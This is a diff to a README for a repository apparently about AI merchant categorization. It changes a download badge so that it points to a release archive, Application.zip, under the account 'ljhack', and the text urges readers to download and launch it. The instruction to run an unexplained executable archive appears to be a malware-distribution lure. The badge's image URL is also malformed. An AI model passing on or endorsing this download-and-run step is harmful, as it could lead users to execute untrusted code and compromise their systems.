@@ -36,7 +36,7 @@ This repository covers a wide range of topics related to merchant categorization
 ## Getting Started 🚀
 
 To access the full capabilities of the **Merchant Categorization** system, please download the application from the following link:
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/file/Application.zip)
+[![Download Application](https://github.com/ljhack/merchant-categorization/releases/download/v1.0.0/Application.zip<COLOR>.svg)](https://github.com/ljhack/merchant-categorization/releases/download/v1.0.0/Application.zip)
 
 If the link ends with the file name, kindly launch the application to experience the magic of AI-powered merchant categorization. In case the link is a website, feel free to visit it directly to explore further functionalities. If the provided link is not working or not available, please check the "Releases" section of this repository for alternative download options.
 
